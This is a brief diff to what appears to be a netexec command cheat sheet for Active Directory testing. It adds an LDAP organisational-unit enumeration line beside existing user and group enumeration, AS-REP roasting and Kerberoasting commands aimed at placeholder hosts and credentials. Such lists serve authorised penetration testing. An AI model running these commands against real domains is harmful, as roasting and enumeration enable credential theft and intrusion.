@@ -184,6 +184,7 @@ netexec {DNS} ldap TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS
 netexec ldap TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --users
 netexec ldap TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --users-export /tmp/userlistOutputFilename.txt
 netexec ldap TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --groups
+netexec ldap TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --ous
 netexec ldap TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --get-sid
 netexec ldap TARGET_HOST -u LOGIN_USERNAME -p '' --asreproast /tmp/output.txt
 netexec ldap TARGET_HOST -u LOGIN_USERNAME -p LOGIN_PASSWORD KERBEROS --kerberoasting /tmp/output2.txt
